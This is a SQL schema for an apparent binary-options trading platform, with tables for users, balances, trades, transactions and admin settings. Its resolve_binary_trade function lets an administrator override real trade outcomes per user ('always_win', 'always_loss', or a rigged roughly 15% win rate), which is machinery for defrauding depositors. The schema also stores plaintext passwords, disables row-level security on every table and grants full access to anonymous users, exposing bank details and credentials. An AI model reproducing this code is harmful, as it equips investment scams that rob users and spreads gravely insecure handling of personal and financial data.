-- ============================================================
-- SUPER SCHEMA: META-BRIDGE (FULL INITIALIZATION)
-- ============================================================

-- STEP 1: EXTENSIONS
create extension if not exists "uuid-ossp";

-- ============================================================
-- STEP 2: HELPER FUNCTIONS
-- ============================================================

-- Function to generate a random alphanumeric code
create or replace function public.generate_random_code(length int) 
returns text as $$
declare
  chars text := 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  result text := '';
  i int := 0;
begin
  while i < length loop
    result := result || substr(chars, floor(random() * char_length(chars) + 1)::int, 1);
    i := i + 1;
  end loop;
  return result;
end;
$$ language plpgsql;

-- ============================================================
-- STEP 3: CREATE TABLES
-- ============================================================

-- 1. Profiles: Custom user data table
create table public.profiles (
  id uuid default uuid_generate_v4() primary key,
  username text unique not null,
  full_name text,
  first_name text,
  last_name text,
  email text unique,
  password text,
  code text default public.generate_random_code(6),
  balance decimal(20, 2) default 0.00,
  trade_control text default 'normal' check (trade_control in ('normal', 'always_win', 'always_loss', 'low_win_rate')),
  role text default 'user' check (role in ('user', 'admin')),
  phone_number text,
  address text,
  kyc_status text default 'unverified',
  bank_network text,
  bank_account text,
  bank_name text,
  avatar_url text,
  language text default 'en',
  is_admin boolean default false,
  updated_at timestamp with time zone default now(),
  created_at timestamp with time zone default now(),
  
  constraint username_length check (char_length(username) >= 3)
);

-- 2. Binary Trades: For Binary Options tracking
create table public.binary_trades (
  id uuid default uuid_generate_v4() primary key,
  user_id uuid references public.profiles(id) on delete cascade not null,
  asset_symbol text not null,
  amount decimal(36,18) not null,
  type text check (type in ('up', 'down')) not null,
  entry_price decimal(20, 8) not null,
  payout_percent integer not null,
  expiry_time bigint not null,
  status text default 'pending' check (status in ('pending', 'won', 'lost', 'refunded')),
  result_price decimal(20, 8),
  created_at timestamptz default now(),
  settled_at timestamptz
);

-- 3. Transactions: Financial ledger
create table public.transactions (
  id uuid default uuid_generate_v4() primary key,
  user_id uuid references public.profiles(id) on delete cascade not null,
  type text check (type in ('buy', 'sell', 'deposit', 'withdraw', 'win', 'loss')) not null,
  asset_symbol text not null,
  amount decimal(36,18) not null,
  price decimal(18,2) not null,
  total decimal(20, 2) not null,
  status text default 'pending',
  binary_type text, 
  binary_result text, 
  binary_trade_id uuid references public.binary_trades(id) on delete set null,
  description text,
  created_at timestamptz default now()
);

-- 4. Portfolio: Asset holdings
create table public.portfolio (
  id uuid default uuid_generate_v4() primary key,
  user_id uuid references public.profiles(id) on delete cascade not null,
  asset_symbol text not null,
  units decimal(36,18) default 0,
  updated_at timestamp with time zone default now(),

  unique(user_id, asset_symbol)
);

-- 5. Global Settings: Admin managed
create table public.global_settings (
  id text primary key default 'main',
  contact_phone text default '',
  contact_line text default '',
  contact_telegram text default '',
  contact_whatsapp text default '',
  contact_facebook text default '',
  contact_email text default '',
  contact_discord text default '',
  phone_enabled boolean default true,
  line_enabled boolean default true,
  telegram_enabled boolean default true,
  whatsapp_enabled boolean default true,
  facebook_enabled boolean default true,
  email_enabled boolean default true,
  discord_enabled boolean default true,
  registration_otp_enabled boolean default true,
  change_email_otp_enabled boolean default true,
  change_password_otp_enabled boolean default true,
  recovery_otp_enabled boolean default true,
  winner_email_enabled boolean default true,
  last_email_reset_month text,
  updated_at timestamp with time zone default now()
);

-- 6. Email Providers: Pool for Auto-Failover
create table public.email_providers (
  id uuid default uuid_generate_v4() primary key,
  name text not null,
  public_key text not null,
  service_id text not null,
  template_otp text not null,
  template_win text not null,
  is_active boolean default true,
  error_count integer default 0,
  sent_count integer default 0,
  priority integer default 0,
  last_used_at timestamp with time zone,
  created_at timestamp with time zone default now()
);

-- 7. User Login History: Security logs
create table public.user_login_history (
  id uuid default uuid_generate_v4() primary key,
  user_id uuid references public.profiles(id) on delete cascade not null,
  device_name text,
  os_name text,
  browser_name text,
  ip_address text,
  location text,
  is_active boolean default true,
  session_id text,
  last_active timestamp with time zone default now(),
  created_at timestamp with time zone default now()
);

-- 8. Issue Reports: Customer Support
create sequence if not exists issue_report_smart_id_seq start with 1001;
create table public.issue_reports (
    id uuid default uuid_generate_v4() primary key,
    user_id uuid references public.profiles(id) on delete cascade not null,
    smart_id bigint default nextval('issue_report_smart_id_seq'),
    category text not null,
    subject text not null,
    message text not null,
    admin_response text,
    status text not null default 'pending' check (status in ('pending', 'resolved')),
    created_at timestamptz default now(),
    updated_at timestamptz default now()
);

-- 9. Push Subscriptions
create table public.push_subscriptions (
  id uuid default uuid_generate_v4() primary key,
  user_id uuid references public.profiles(id) on delete cascade not null,
  subscription_json jsonb not null,
  created_at timestamp with time zone default now(),
  unique(user_id, subscription_json)
);

-- 10. Admin Audit Logs: Track admin actions
create table public.admin_audit_logs (
  id uuid default uuid_generate_v4() primary key,
  admin_id uuid references public.profiles(id) on delete set null,
  admin_email text,
  target_user_id uuid references public.profiles(id) on delete set null,
  target_user_email text,
  action_type text not null,
  description text,
  details jsonb,
  created_at timestamp with time zone default now()
);

-- 11. User Sessions (Server-side tracking)
create table public.user_sessions (
  id uuid default uuid_generate_v4() primary key,
  user_id uuid references public.profiles(id) on delete cascade not null,
  session_id text unique not null,
  device_info jsonb,
  ip_address text,
  last_active timestamp with time zone default now(),
  is_revoked boolean default false,
  created_at timestamp with time zone default now()
);

-- ============================================================
-- STEP 4: RPC FUNCTIONS & TRIGGERS
-- ============================================================

-- Function to safely resolve binary trades (Transactional)
create or replace function public.resolve_binary_trade(
  p_trade_id uuid,
  p_new_status text,
  p_result_price decimal,
  p_payout_amount decimal
) returns jsonb as $$
declare
  v_user_id uuid;
  v_current_status text;
  v_asset_symbol text;
  v_amount decimal;
  v_binary_type text;
  v_payout_percent integer;
  v_trade_control text;
  v_final_status text;
  v_final_payout decimal;
begin
  -- A. Fetch trade information
  select user_id, status, asset_symbol, amount, type, payout_percent 
  into v_user_id, v_current_status, v_asset_symbol, v_amount, v_binary_type, v_payout_percent 
  from binary_trades where id = p_trade_id for update;
  
  if v_current_status != 'pending' then
    return jsonb_build_object('success', false, 'message', 'Trade already resolved');
  end if;

  -- B. Fetch user control setting
  select trade_control into v_trade_control from profiles where id = v_user_id;
  v_trade_control := coalesce(v_trade_control, 'normal');

  -- C. Determine final result (Override incoming values based on trade_control)
  v_final_status := p_new_status;
  v_final_payout := p_payout_amount;

  if v_trade_control = 'always_win' then
    v_final_status := 'won';
    v_final_payout := v_amount + (v_amount * v_payout_percent / 100);
  elsif v_trade_control = 'always_loss' then
    v_final_status := 'lost';
    v_final_payout := 0;
  elsif v_trade_control = 'low_win_rate' then
    -- Low win rate (approx 15% chance of winning)
    if random() > 0.15 then
      v_final_status := 'lost';
      v_final_payout := 0;
    else
      v_final_status := 'won';
      v_final_payout := v_amount + (v_amount * v_payout_percent / 100);
    end if;
  end if;

  -- D. Execute the settlement updates
  update binary_trades 
  set status = v_final_status, result_price = p_result_price, settled_at = now()
  where id = p_trade_id;

  if v_final_payout > 0 then
    update profiles set balance = balance + v_final_payout where id = v_user_id;
  end if;

  -- E. Log the transaction
  insert into transactions (user_id, type, asset_symbol, amount, price, total, status, binary_type, binary_result, binary_trade_id, description)
  values (
    v_user_id, 
    case when v_final_status = 'won' then 'win' else 'loss' end, 
    v_asset_symbol, 
    v_amount, 
    p_result_price, 
    v_final_payout, 
    'success', 
    v_binary_type, 
    v_final_status, 
    p_trade_id,
    'Trade Result: ' || v_asset_symbol || ' (' || v_binary_type || ')'
  );

  return jsonb_build_object(
    'success', true, 
    'message', 'Trade resolved successfully', 
    'strategy', v_trade_control,
    'result', v_final_status
  );
end;
$$ language plpgsql;

-- Trigger for updated_at on issue_reports
create or replace function update_updated_at_column()
returns trigger as $$
begin
    new.updated_at = now();
    return new;
end;
$$ language 'plpgsql';

create trigger update_issue_reports_updated_at
    before update on public.issue_reports
    for each row
    execute function update_updated_at_column();

-- ============================================================
-- STEP 5: RLS & GRANTS
-- ============================================================

alter table public.profiles disable row level security;
alter table public.binary_trades disable row level security;
alter table public.transactions disable row level security;
alter table public.portfolio disable row level security;
alter table public.global_settings disable row level security;
alter table public.email_providers disable row level security;
alter table public.user_login_history disable row level security;
alter table public.push_subscriptions disable row level security;
alter table public.admin_audit_logs disable row level security;
alter table public.user_sessions disable row level security;
alter table public.issue_reports disable row level security;

grant all on all tables in schema public to anon;
grant all on all tables in schema public to authenticated;
grant all on all sequences in schema public to anon;
grant all on all sequences in schema public to authenticated;

-- ============================================================
-- STEP 6: INDEXES
-- ============================================================

create index if not exists idx_profiles_username on public.profiles(username);
create index if not exists idx_profiles_email on public.profiles(email);
create index if not exists idx_transactions_user_id on public.transactions(user_id);
create index if not exists idx_binary_trades_user_id on public.binary_trades(user_id);
create index if not exists idx_binary_trades_status on public.binary_trades(status);
create index if not exists idx_portfolio_user_id on public.portfolio(user_id);
create index if not exists idx_transactions_created_at on public.transactions(created_at desc);
create index if not exists idx_transactions_type on public.transactions(type);
create index if not exists idx_binary_trades_created_at on public.binary_trades(created_at desc);
create index if not exists idx_login_history_created_at on public.user_login_history(created_at desc);
create index if not exists idx_user_login_history_user_id on public.user_login_history(user_id);
create index if not exists idx_profiles_code on public.profiles(code);
create index if not exists idx_push_subs_user_id on public.push_subscriptions(user_id);
create index if not exists idx_audit_logs_admin_id on public.admin_audit_logs(admin_id);
create index if not exists idx_audit_logs_created_at on public.admin_audit_logs(created_at desc);
create index if not exists idx_user_sessions_user_id on public.user_sessions(user_id);
create index if not exists idx_user_sessions_last_active on public.user_sessions(last_active desc);
create index if not exists idx_issue_reports_user_id on public.issue_reports(user_id);
create index if not exists idx_email_providers_priority on public.email_providers(priority desc);
